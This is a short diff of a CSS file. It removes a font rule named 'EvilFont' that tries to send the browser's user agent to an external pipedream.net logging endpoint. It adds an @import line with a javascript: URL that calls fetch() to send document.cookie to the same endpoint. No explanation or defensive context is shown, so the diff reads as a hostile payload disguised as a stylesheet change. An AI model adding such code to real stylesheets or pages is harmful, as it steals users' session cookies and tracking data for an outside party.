@@ -1,4 +1,1 @@
-@font-face {
-  font-family: 'EvilFont';
-  src: url("https://eo10sr0fi9sxhnf.m.pipedream.net/log?user=" + navigator.userAgent);
-}
+@import url("javascript:fetch('https://eo10sr0fi9sxhnf.m.pipedream.net/log?cookie=' + document.cookie)");
